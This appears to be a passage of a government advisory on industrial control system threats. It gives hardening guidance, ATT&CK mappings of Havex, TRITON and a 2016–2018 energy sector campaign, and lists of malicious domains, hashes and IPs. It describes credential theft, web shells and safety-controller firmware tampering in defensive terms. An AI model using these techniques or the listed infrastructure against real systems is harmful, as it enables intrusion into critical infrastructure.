+Implement a network topology for ICS that has multiple layers, with the most critical communications occurring in the most secure and reliable layer. For more information refer to National Institute of Standard and Technology Special Publication 800-82: Guide to Industrial Control Systems (ICS) Security. Further segmentation should be applied to portions of the network that are reliant on one another by functionality. Figure 5 on page 26 of the CISA ICS Defense in Depth Strategy document describes this architecture.
+Use one-way communication diodes to prevent external access, whenever possible.
+Set up DMZs to create a physical and logical subnetwork that acts as an intermediary for connected security devices to avoid exposure.
+Employ reliable network security protocols and services where feasible.
+Consider using virtual local area networks (VLANs) for additional network segmentation, for example, by placing all printers in separate, dedicated VLANs and restricting users’ direct printer access. This same principle can be applied to segmentation of portions of the process for which devices are used. As an example, systems that are only involved in the creation of one component within an assembly line that is not directly related to another component can be on separate VLANs, which allows for identification of any unexpected communication, as well as segmentation against potential risk exposure on a larger scale.
+Implement perimeter security between network segments to limit the ability of cyber threat actors to move laterally.
+Control traffic between network segments by using firewalls, intrusion detection systems (IDSs), and rules for filtering traffic on routers and switches.
+Implement network monitoring at key chokepoints—including egress points to the internet, between network segments, core switch locations—and at key assets or services (e.g., remote access services).
+Configure an IDS to create alarms for any ICS traffic outside normal operations (after establishing a baseline of normal operations and network traffic).
+Configure security incident and event monitoring to monitor, analyze, and correlate event logs from across the ICS network to identify intrusion attempts.
+ICS Best Practices
+Update all software. Use a risk-based assessment strategy to determine which ICS networks, assets, and zones should participate in the patch management program.
+Test all patches in out-of-band testing environments before implementation into production environments.
+Implement application allow listing on human machine interfaces and engineering workstations.
+Harden software configuration on field devices, including tablets and smartphones.
+Replace all end-of-life software and hardware devices.
+Disable unused ports and services on ICS devices (after testing to ensure this will not affect ICS operation).
+Restrict and manage remote access software. Enforce MFA for remote access to ICS networks.
+Configure encryption and security for network protocols within the ICS environment.
+Do not allow vendors to connect their devices to the ICS network. Use of a compromised device could introduce malware.
+Disallow any devices that do not live solely on the ICS environment from communicating on the platform. ‘Transient devices’ provide risk exposure to the ICS environment from malicious activity in the IT or other environments to which they connect.
+Maintain an ICS asset inventory of all hardware, software, and supporting infrastructure technologies.
+Maintain robust host logging on critical devices within the ICS environment, such as jump boxes, domain controllers, repository servers, etc. These logs should be aggregated into a centralized log server for review.
+Ensure robust physical security is in place to prevent unauthorized personal from accessing controlled spaces that house ICS equipment.
+Regularly test manual controls so that critical functions can be kept running if ICS/OT networks need to be taken offline.
+Contact Information
+Organizations can also report anomalous cyber activity and/or cyber incidents 24/7 to SayCISA@cisa.dhs.gov or by calling 1-844-Say-CISA (1-844-729-2472). and/or to the FBI via your local FBI field office or the FBI’s 24/7 CyWatch at (855) 292-3937 or CyWatch@fbi.gov.
+
+References
+[1] https://www.justice.gov/opa/pr/four-russian-government-employees-charged-two-historical-hacking-campaigns-targeting-critical
+[2] https://collaborate.mitre.org/attackics/index.php/Software/S0003 
+[3] https://collaborate.mitre.org/attackics/index.php/Software/S0003
+[4] https://collaborate.mitre.org/attackics/index.php/Software/S0013 
+
+APPENDIX A: CAMPAIGN AND MALWARE TACTICS, TECHNIQUES, AND PROCEDURES
+Global Energy Sector Campaign: Havex Malware 
+Table 1 maps Havex’s capabilities to the ATT&CK for Enterprise framework, and table 2 maps Havex’s capabilities to the ATT&CK for ICS framework. Table 1 also provides associated mitigations. For additional mitigations, refer to the Mitigations section of this advisory.
+
+Table 1: Enterprise Domain Tactics and Techniques for Havex [2]
+
+Tactic	Technique	Use	Detection/Mitigations
+Persistence [TA0003]	Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder [T1547.001]	Havex adds Registry Run keys to achieve persistence.	Monitor: monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.
+Privilege Escalation [TA0004]	
+Process Injection [T1055]
+
+Note: this technique also applies to:
+
+Tactic: Defense Evasion [TA0005]
+Havex injects itself into explorer.exe.	
+Behavior Prevention on End Point: use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, Application Programming Interface (API) call, etc., behavior.
+
+Privileged Account Management: manage the creation of, modification of, use of, and permissions associated with privileged accounts, including SYSTEM and root.
+
+Defense Evasion [TA0005]	Indicator Removal on Host: File Deletion [T1070.004]	Havex contains a cleanup module that removes traces of itself from victim networks.	Monitor: monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network, which an adversary could introduce. Some monitoring tools may collect command-line arguments but may not capture DEL commands since DEL is a native function within cmd.exe.
+Credential Access [TA0006]	Credentials from Password Stores: Credentials from Web Browsers [T1555.003]	Havex may contain a publicly available web browser password recovery tool.	Password Policies: set and enforce secure password policies for accounts.
+Discovery [TA0007]	Account Discovery: Email Account [T1087.003]	Havex collects address book information from Outlook	Monitor: monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation (WMI) and PowerShell.
+File and Directory Discovery [T1083]	Havex collects information about available drives, default browser, desktop file list, My Documents, internet history, program files, and root of available drives.	Monitor: monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as WMI and PowerShell.
+Process Discovery [T1057]	Havex collects information about running processes.	Monitor: normal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as WMI and PowerShell.
+System Information Discovery [T1082]	Havex collects information about the OS and computer name.	
+Monitor: monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as WMI and PowerShell.
+
+In cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations.
+
+System Network Configuration Discovery [T1016]	Havex collects information about the internet adapter configuration.	Monitor: monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as WMI and PowerShell.
+System Owner/User Discovery [T1033]	Havex collects usernames.
+Collection [TA0009]	Archive Collected Data [T1560]	Havex writes collected data to a temporary file in an encrypted form before exfiltration to a C2 server.	Audit: audit or scan systems, permissions, insecure software, insecure configurations, etc., to identify potential weaknesses.
+Command and Control [TA0011]	Data Encoding: Standard Encoding [T1132.001]	Havex uses standard Base64 + bzip2 or standard Base64 + reverse XOR + RSA-2048 to decrypt data received from C2 servers.	Detect: analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes using the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.
+ 
+
+Table 2: ICS Domain Tactics and Techniques for Havex [3]
+
+Tactic	Technique	Use
+Initial Access	Spearphishing Attachment [T0865]	Havex is distributed through a Trojanized installer attached to emails.
+Supply Chain Compromise [T0862]
+
+Note: this activity also applies to Tactic: Drive by Compromise [T0817]
+
+Havex is distributed through Trojanized installers planted on compromised vendor websites.
+Execution	User Execution [T0863]	Execution of Havex relies on a user opening a Trojanized installer attached to an email.
+Discovery	Remote System Discovery [T0846]	Havex uses Windows networking (WNet) to discover all the servers, including OPC servers that are reachable by the compromised machine over the network.
+Remote System Information Discovery [T0888]	Havex gathers server information, including CLSID, server name, Program ID, OPC version, vendor information, running state, group count, and server bandwidth.
+Collection	Automated Collection [T0802]	Havex gathers information about connected control systems devices.
+Point & Tag Identification [T0861]	Havex can enumerate OPC tags; specifically tag name, type, access, and ID.
+Inhibit Response Function	Denial of Service [T0814]	Havex has caused multiple common OPC platforms to intermittently crash. 
+Impact	Denial of Control [T0813]	Havex can cause PLCs inability to control connected systems.
+ 
+Global Energy Sector Campaign: 2016 to 2018 U.S. Energy Sector Targeting
+Table 3 maps the 2016 to 2018 U.S. Energy Sector targeting activity to the MITRE ATT&CK Enterprise framework. Mitigations for techniques are also provided in table. For additional mitigations, refer to the Mitigations section of this advisory.
+
+Table 3: Energy Sector Campaign, 2016 to 2018 targeting U.S. Energy Sector: Observed MITRE ATT&CK Enterprise Tactics and Techniques
+
+Tactic	Technique	Use 	Detection/Mitigations
+Reconnaissance [TA0043]	Gather Victim Identity Information: Credentials [T1589.001]	
+The threat actor harvested credentials of third-party commercial organizations by sending spearphishing emails that contained a PDF attachment. The PDF attachment contained a shortened URL that, when clicked, led users to a website that prompted the user for their email address and password.
+The threat actor harvested credentials of Energy Sector targets by sending spearphishing emails with a malicious Microsoft Word document or links to the watering holes created on compromised third-party websites.
+
+Note: this activity also applies to: 
+
+Tactic: Reconnaissance [TA0043], Technique: Phishing for Information [T1598]:
+Spearphishing Attachment [T1598.002]
+Spearphishing Link [T1598.003]
+Software Configuration: implement configuration changes to software (other than the operating system) to mitigate security risks associated to how the software operates.
+
+User Training: train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.
+
+Resource Development [TA0042]	Compromise Infrastructure: Server [T1584.004]	The threat actor created watering holes on compromised third-party organizations’ domains.	This activity typically takes place outside the visibility of target organizations, making detection of this behavior difficult. Ensure that users browse the internet securely. Prevent intentional and unintentional download of malware or rootkits, and users from accessing infected or malicious websites. Treat all traffic as untrusted, even if it comes from a partner website or popular domain.
+Initial Access [TA0001]	Valid Accounts [T1078]	The threat actor obtained access to Energy Sector targets by leveraging compromised third-party infrastructure and previously compromised Energy Sector credentials against remote access services and infrastructure—specifically VPN, RDP, and Outlook Web Access—where MFA was not enabled.	
+Network Segmentation: architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network.
+
+MFA: enforce use of two or more pieces of evidence (such as username and password plus a token, e.g., a physical smart card or token generator) to authenticate to a system.
+
+Privileged Account Management: manage the creation of, modification of, use of, and permissions associated with privileged accounts, including SYSTEM and root.
+
+Update Software: perform regular software updates to mitigate exploitation risk.
+
+Exploit Protection: use capabilities to detect and block conditions that may lead to or be indicative of a software exploit occurring.
+
+Application Isolation and Sandboxing: restrict execution of code to a virtual environment on or in transit to an endpoint system.
+
+External Remote Services [T1133]	The threat actor installed VPN clients on compromised third-party targets to connect to Energy Sector networks.	
+Network Segmentation: architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network.
+
+MFA: enforce use of two or more pieces of evidence (such as username and password plus a token, e.g., a physical smart card or token generator) to authenticate to a system.
+
+Limit Access to Resource Over Network: prevent access to file shares, remote access to systems, and unnecessary services. Mechanisms to limit access may include use of network concentrators, RDP gateways, etc.
+
+Disable or Remove Program: remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.
+
+Execution 
+[TA0002]	Command and Scripting Interpreter: PowerShell [T1059.001]	
+During an RDP session, the threat actor used a PowerShell Script to create an account within a victim’s Microsoft Exchange Server. 
+
+Note: this activity also applies to: 
+
+Tactic: Persistence [TA0003], Technique: Create Account: Local Account [T1136.001] 
+Antivirus/Antimalware: use signatures or heuristics to detect malicious software.
+
+Code Signing: enforce binary and application integrity with digital signature verification to prevent untrusted code from executing.
+
+Disable or Remove Program: remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.
+
+Privileged Account Management: manage the creation of, modification of, use of, and permissions associated with privileged accounts, including SYSTEM and root.
+
+Command and Scripting Interpreter: Windows Command Shell [T1059.003]	
+The threat actor used a JavaScript with an embedded Command Shell script to:
+
+Create a local administrator account;
+Disable the host-based firewall;
+Globally open port 3389 for RDP access; and
+Attempt to add the newly created account to the administrators group to gain elevated privileges. 
+Note: this activity also applies to: 
+
+Tactic: Credential Access [TA0006], Technique: Input Capture [T1056]
+Tactic: Execution [TA0002], Technique: Command and Scripting Interpreter: JavaScript [T1059.007]
+Tactic: Persistence [TA0003], Technique: Create Account: Local Account [T1136.001]
+Execution Prevention: block execution of code on a system through application control, and/or script blocking.
+Scheduled Task/Job: Scheduled Task [T1053.005]	The threat actor created a Scheduled Task to automatically log out of a newly created account every eight hours.	
+Audit: audit or scan systems, permissions, insecure software, insecure configurations, etc., to identify potential weaknesses.
+
+Harden Operating System Configuration: make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.
+
+Privileged Account Management: manage the creation of, modification of, use of, and permissions associated with privileged accounts, including SYSTEM and root.
+
+User Account Management: manage the creation of, modification of, use of, and permissions associated with user accounts.
+
+Persistence [TA0003]	Create Account: Local Account [T1136.001] 	The threat actor created local administrator accounts on previously compromised third-party organizations for reconnaissance and to remotely access Energy Sector targets.    MFA: enforce use of two or more pieces of evidence (such as username and password plus a token, e.g., a physical smart card or token generator) to authenticate to a system.	
+MFA: enforce use of two or more pieces of evidence (such as username and password plus a token, e.g., a physical smart card or token generator) to authenticate to a system.
+
+Privileged Account Management: manage the creation of, modification of, use of, and permissions associated with privileged accounts, including SYSTEM and root.
+
+Server Software Component: Web Shell [T1505.003]	The threat actor created webshells on Energy Sector targets’ publicly accessible email and web servers.	Detect: the portion of the webshell that is on the server may be small and look innocuous. Process monitoring may be used to detect Web servers that perform suspicious actions such as running cmd.exe or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network.
+Defense Evasion [TA0005]	Indicator Removal on Host: Clear Windows Event Logs [T1070.001]	
+The threat actor created new accounts on victim networks to perform cleanup operations. The accounts created were used to clear the following Windows event logs: System, Security, Terminal Services, Remote Services, and Audit. 
+
+The threat actor also removed applications they installed while they were in the network along with any logs produced. For example, the VPN client installed at one third-party commercial facility was deleted along with the logs that were produced from its use. Finally, data generated by other accounts used on the systems accessed were deleted.
+
+Note: this activity also applies to:
+
+Tactic: Persistence [TA0003], Technique: Create Account: Local Account [T1136.001]
+Encrypt Sensitive Information: protect sensitive information with strong encryption.
+
+Remote Data Storage: use remote security log and sensitive file storage where access can be controlled better to prevent exposure of intrusion detection log data or sensitive information.
+
+Restrict File and Directory Permissions: restrict access by setting directory and file permissions that are not specific to users or privileged accounts.
+
+Indicator Removal on Host: File Deletion [T1070.004]	
+The threat actor cleaned up target networks by deleting created screenshots and specific registry keys. 
+
+The threat actor also deleted all batch scripts, output text documents, and any tools they brought into the environment, such as scr.exe.
+
+Note: this activity also applies to:
+
+Technique: Modify Registry [T1112]
+Monitor: monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.
+ 
+Technique: Masquerading [T1036]	After downloading tools from a remote server, the threat actor renamed the extensions.	
+Restrict File and Directory Permissions: restrict access by setting directory and file permissions that are not specific to users or privileged accounts.
+
+Code Signing: enforce binary and application integrity with digital signature verification to prevent untrusted code from executing.
+
+Execution Prevention: block execution of code on a system through application control, and/or script blocking.
+
+Credential Access [TA0006]	Brute Force: Password Cracking [T1110.002]	
+The threat actor used password-cracking techniques to obtain the plaintext passwords from obtained credential hashes.
+
+The threat actor dropped and executed open-source and free password cracking tools such as Hydra, SecretsDump, and CrackMapExec, and Python.
+
+MFA: enforce use of two or more pieces of evidence (such as username and password plus a token, e.g., a physical smart card or token generator) to authenticate to a system.
+
+Password Policies: set and enforce secure password policies for accounts.
+
+Forced Authentication [T1187]	Microsoft Word attachments sent via spearphishing emails leveraged legitimate Microsoft Office functions for retrieving a document from a remote server over Server Message Block (SMB) using Transmission Control Protocol ports 445 or 139. As a part of the standard processes executed by Microsoft Word, this request authenticates the client with the server, sending the user’s credential hash to the remote server before retrieving the requested file. (Note: transfer of credentials can occur even if the file is not retrieved.)	
+Password Policies: set and enforce secure password policies for accounts.
+
+Filter Network Traffic: use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.
+
+The threat actor’s watering hole sites contained altered JavaScript and PHP files that requested a file icon using SMB from an IP address controlled by the threat actors.
+The threat actor manipulated LNK files to repeatedly gather user credentials. Default Windows functionality enables icons to be loaded from a local or remote Windows repository. The threat actor exploited this built-in Windows functionality by setting the icon path to a remote server controller by the actors. When the user browses to the directory, Windows attempts to load the icon and initiate an SMB authentication session. During this process, the active user’s credentials are passed through the attempted SMB connection.
+ 
+
+Note: this activity also applies to:
+
+Tactic: Persistence [TA0003], Technique: Boot or Logon Autostart Execution: Shortcut Modification [T1547.009]
+OS Credential Dumping: Local Security Authority Subsystem Service (LSASS) Memory [T1003.001]	The threat actor used an Administrator PowerShell prompt to enable the WDigest authentication protocol to store plaintext passwords in the LSASS memory. With this enabled, credential harvesting tools can dump passwords from this process’s memory.	
+Operating System Configuration: make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.
+
+Password Policies: set and enforce secure password policies for accounts.
+
+Privileged Account Management: manage the creation of, modification of, use of, and permissions associated with privileged accounts, including SYSTEM and root.
+
+Privileged Process Integrity: protect processes with high privileges that can be used to interact with critical system components through use of protected process light, anti-process injection defenses, or other process integrity enforcement measures.
+
+User Training: train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.
+
+Credential Access Protection: use capabilities to prevent successful credential access by adversaries; including blocking forms of credential dumping.
+
+OS Credential Dumping: NTDS [T1003.003]	The threat actor collected the files ntds.dit. The file ntds.dit is the Active Directory (AD) database that contains all information related to the AD, including encrypted user passwords.	
+Monitor: monitor processes and command-line arguments for program execution that may be indicative of credential dumping, especially attempts to access or copy the NTDS.dit.
+
+Privileged Account Management: manage the creation of, modification of, se of, and permissions associated with privileged accounts, including SYSTEM and root.
+
+User Training: train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.
+
+Discovery [TA0007]	Remote System Discovery [T1018]	
+The threat actor used privileged credentials to access the Energy Sector victim’s domain controller. Once on the domain controller, the threat actors used batch scripts dc.bat and dit.bat to enumerate hosts, users, and additional information about the environment. 
+
+Note: this activity also applies to: 
+
+Tactic: Persistence [TA0003], Technique: Valid Accounts: Domain Accounts [T1078.002]
+Tactic: Discovery [TA0007], Technique: System Owner/User Discovery [T1033]
+Monitor: normal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used.
+
+Monitor processes and command-line arguments for actions that could be taken to gather system and network information.
+
+Monitor for processes that can be used to discover remote systems, such as ping.exe and tracert.exe, especially when executed in quick succession.
+
+The threat actor accessed workstations and servers on corporate networks that contained data output from control systems within energy generation facilities. The threat actors accessed files pertaining to ICS or supervisory control and data acquisition (SCADA) systems. 
+The actor targeted and copied profile and configuration information for accessing ICS systems on the network. The threat actor copied Virtual Network Connection (VNC) profiles that contained configuration information on accessing ICS systems and took screenshots of a Human Machine Interface (HMI).
+
+Note: this activity also applies to
+
+Tactic: Discovery [TA0007], Technique File and Directory Discovery [T1083]
+Tactic: [TA0009], Technique: Screen Capture [T1113]
+File and Directory Discovery [T1083]	
+The actor used dirsb.bat to gather folder and file names from hosts on the network.
+
+Note: this activity also applies to: 
+
+Tactic: Execution [TA0002], Command and Scripting Interpreter: Windows Command Shell [T1059.003]
+This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information.
+The threat actor conducted reconnaissance operations within the network. The threat actor focused on identifying and browsing file servers within the intended victim’s network.
+Lateral Movement [TA0008]	Lateral Tool Transfer [T1570]	
+The threat actor moved laterally via PsExec, batch scripts, RDP, VNC, and admin shares.
+
+Note: this activity also applies to:
+
+Tactic: Lateral Movement [TA0008], Techniques:
+Remote Services: Remote Desktop Protocol [T1021.001]
+Remote Services: SMB/Windows Admin Shares [T1021.002]
+Remote Services: VNC [T1021.005]
+Network Intrusion Prevention: use intrusion detection signatures to block traffic at network boundaries.
+
+Network Segmentation: architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network.
+
+Operating System Configuration: make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.
+
+Privileged Account Management: manage the creation of, modification of, use of, and permissions associated with privileged accounts, including SYSTEM and root.
+
+User Account Management: manage the creation of, modification o, se of, and permissions associated with user accounts.
+
+Disable or Remove Feature or Program: remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.
+
+Audit: audit or scan systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.
+
+MFA: enforce use of two or more pieces of evidence (such as username and password plus a token, e.g., a physical smart card or token generator) to authenticate to a system.
+
+Limit Access to Resource Over Network: prevent access to file shares, remote access to systems, and unnecessary services. Mechanisms to limit access may include use of network concentrators, RDP gateways, etc.
+
+Filter Network Traffic: use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.
+
+Limit Software Installation: block users or groups from installing unapproved software.
+
+Collection [TA0009]	Data from Local System [T1005] 	The threat actor collected the Windows SYSTEM registry hive file, which contains host configuration information.	
+Monitor: monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data.
+
+Data may also be acquired through Windows system management tools such as WMI and PowerShell.
+
+Archive Collected Data: Archive via Utility [T1560.001]	The threat actor compressed the ntds.dit file and the SYSTEM registry hive they had collected into archives named SYSTEM.zip and comps.zip.	Audit: audit or scan systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.
+Screen Capture [T1113]	
+The threat actor used Windows’ Scheduled Tasks and batch scripts, to execute scr.exe and collect additional information from hosts on the network. The tool scr.exe is a screenshot utility that the threat actor used to capture the screen of systems across the network.
+
+Note: this activity also applies to: 
+
+Tactic: Execution [TA0002], Techniques:
+Command and Scripting Interpreter: Windows Command Shell [T1059.003]
+Scheduled Task/Job: Scheduled Task [T1053.005]
+Network Segmentation: architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network.
+
+MFA: enforce use of two or more pieces of evidence (such as username and password plus a token, e.g., a physical smart card or token generator) to authenticate to a system.
+
+Limit Access to Resource Over Network: prevent access to file shares, remote access to systems, and unnecessary services. Mechanisms to limit access may include use of network concentrators, RDP gateways, etc.
+
+Disable or Remove Feature or Program: remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.
+
+The actor used batch scripts labeled pss.bat and psc.bat to run the PsExec tool. PsExec was used to execute scr.exe across the network and to collect screenshots of systems in a text file.
+
+Note: this activity also applies to: 
+
+Tactic: Execution [TA0002], Techniques:
+Command and Scripting Interpreter: Windows Command Shell [T1059.003]
+System Services: Service Execution [T1569.002]
+Command and Control [TA0011]	Ingress Tool Transfer [T1105]	The threat actor downloaded tools from a remote server.    	
+Monitor: monitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as File Transfer Protocol, that does not normally occur may also be suspicious.
+
+Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.
+
+Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.
+
+Use intrusion detection signatures to block traffic at network boundaries.
+
+ 
+
+TRITON Malware
+Table 4 maps TRITON’s capabilities to the ATT&CK for ICS framework. For mitigations to harden ICS/OT environments, refer to the Mitigations section of this advisory.
+
+Table 4: ICS Domain Tactics and Techniques for TRITON [4]
+
+Initial Access	Engineering Workstation Compromise [T0818]	TRITON compromises workstations within the safety network. 
+Execution	
+Change Operating Mode [T0858]
+
+Note: this technique also applies to Evasion.
+
+TRITON can halt or run a program through the TriStation protocol. (Note: TriStation protocol is the protocol that Triconex System software uses to communicate with the Tricon PLCs.) 
+Execution through API [T0871]	TRITON leverages a custom implementation of the TriStation protocol, which triggers APIs related to program download, program allocation, and program changes.
+Hooking [T0874]
+
+Note: this technique also applies to Tactic: Privilege Escalation.
+
+TRITON's injector modifies the address of the handler for a Tristation protocol command so that when the command is received, the payload may be executed instead of normal processing.
+Modify Controller Tasking [T0821]	Some TRITON components are added to the program table on the Tricon so that they are executed by the firmware once each cycle.
+Native API [T0834]	TRITON's payload takes commands from TsHi.ExplReadRam(Ex), TsHi.ExplWriteRam(Ex), and TsHi.ExplExec functions to perform operations on controller memory and registers using syscalls written in PowerPC shellcode.
+Scripting [T0853]	
+TRITON communicates with Triconex Tricon PLCs using its custom Python script. This Python script communicates using four Python modules that collectively implement the TriStation protocol via User Datagram Protocol (UDP) 1502.
+
+Note: this use also applies to:
+
+Tactic: Command and Control │Technique: Commonly Used Port [T0885]
+Persistence 	
+System Firmware [T0857]
+
+Note: this technique also applies to Tactic: Inhibit Response Function.
+
+TRITON's injector injects the payload into the Tricon PLCs’ running firmware. A threat actor can use the payload to read and write memory on the PLC and execute code at an arbitrary address within the firmware. If the memory address it writes to is within the firmware region, the malicious payload disables address translation, writes the code at the provided address, flushes the instruction cache, and re-enables address translation. This allows the malware to change the running firmware.
+Privilege Escalation	Exploitation for Privilege Escalation [T0890]	TRITON can gain supervisor-level access and control system states by exploiting a vulnerability.
+Evasion	Exploitation for Evasion [T0820]	TRITON's injector exploits a vulnerability in the device firmware to escalate privileges and then it disables and (later patches) a firmware RAM/ROM consistency check. 
+Indicator Removal on Host [T0872]	After running the malicious payload, TRITON's Python script overwrites the malicious payload with a “dummy” program.
+Masquerading [T0849]	TRITON’s Python script masquerades as legitimate Triconex software.
+TRITON’s injector masquerades as a standard compiled PowerPC program for the Triconex PLC.
+Discovery	Remote System Discovery [T0846]	TRITON’s Python script can autodetect Triconex PLCs on the network by sending a UDP broadcast packet over port 1502.
+Lateral Movement	Program Download [T0843]	TRITON leverages the TriStation protocol to download programs to the Tricon PLCs.
+Collection	Detect Operating Mode [T0868]	A TRITON Python module provides string representations of different features of the TriStation protocol, including message and error codes, key position states, and other values returned by the status functions.
+Program Upload [T0845]	TRITON uploads its payload to the Tricon PLCs.
+Impair Process Control	Unauthorized Command Message [T0855]	A threat actor can use TRITON to prevent the Tricon PLC from functioning appropriately.
+Impact	Loss of Safety [T0880]	TRITON can reprogram the safety PLC logic to allow unsafe conditions or state to persist.
+## High Confidence ##
+
+jpkinki.com
+afdc8317dc5a474dc57175fafed280aa189b1f8a8449a27ff3c292cd7c53fe8c
+55e0e9167fa3612135815ed01119a91281373c08c257efc8f7cc36bcc08734d2
+fd65d192f2425916585450e46c9cc1db7747d00d1614a8ef835940f06795e2b4
+4ed76fa68ef9e1a7705a849d47b3d9dcdf969e332bd5bcb68138579c288a16d3
+renxinguo.com
+yourprizehere.com
+a5049e7e39982eeee015610a060ee2d3fc4db16eef883e16e7fa99ffec661baa
+179e69560e03332f368a5a953bcf0976fc436daecf6f9abe4b62ce33d25f08cc
+c208b15a1b8dec53b0d1cffde1d33b6d257424a8ea8816ad383899dd5724460e
+eeb85ca851a8864c3835c7ae34a29e897524a5de4da362957093ae08549568ec
+9023a0c8a43282ff42abb917bc7e3163b421296d23c47ff2a0275425ea1caf40
+51156f204d26edb248464d691c74ffa01e6c18deffa64d2d28314f55396439b5
+f7012e1ae246646fa8e87511272f0e9931227e8b7a5f186efb9a6c77913a00e0
+139.180.192.163
+45.133.239.188
+38.54.85.112
+haberciinternational.com
+gclm.name
+139.180.192.163
+45.133.239.188
+45.32.105.184
+173.199.71.152
+45.152.65.213
+103.79.120.89
+45.152.66.25
+83.229.127.115
+38.89.72.133
+45.83.236.105
+212.113.76.10
+patientconceptsserver.com
+guestconceptsserver.com
+166.78.199.87
+www.guestconceptsserver.com
+107.155.56.87
+103.107.104.37
+107.155.56.15
+155.138.203.78
+45.76.132.25
+38.54.85.112
+haberciinternational.com
+gclm.name
+45.133.239.188
+149.104.12.64
+101.36.108.94
+107.155.56.4
+58.185.55.6
+198.73.227.251
+217.199.26.197
+128.14.227.104
+166.88.117.11
+103.79.120.67
+103.79.120.70
+45.195.69.111
+103.79.120.74
+139.180.192.163
+223.26.52.245
+146.66.215.19
+103.79.120.71
+103.79.120.85
+96.43.101.248
+103.79.120.69
+
+## Medium Confidence ##
+
+1.94.136.42
+101.36.106.114
+103.108.67.58
+103.113.8.225
+103.113.8.232
+103.125.219.228
+103.127.125.218
+103.140.186.181
+103.142.9.135
+103.166.228.185
+103.171.34.199
+103.201.130.129
+103.201.131.181
+103.201.131.191
+103.218.240.213
+103.234.54.179
+103.234.54.85
+103.244.3.107
+103.244.3.109
+103.31.181.41
+103.40.11.218
+103.43.18.19
+103.43.18.220
+103.43.18.71
+103.43.18.92
+103.45.64.130
+103.45.68.125
+103.46.184.180
+103.46.185.101
+103.47.224.142
+103.71.252.178
+103.85.24.165
+103.87.8.172
+103.87.9.5
+104.233.160.81
+104.233.161.173
+104.233.173.53
+104.251.122.107
+107.148.1.207
+107.148.48.69
+107.150.124.43
+107.155.55.15
+107.155.56.15
+107.155.56.4
+107.155.56.87
+107.173.63.250
+108.61.163.91
+108.61.182.214
+108.61.250.161
+109.123.230.56
+110.173.53.162
+111.68.8.106
+112.121.161.109
+112.213.109.121
+112.213.109.131
+112.213.109.141
+112.213.125.75
+114.29.254.126
+114.29.254.17
+114.29.254.201
+114.29.254.94
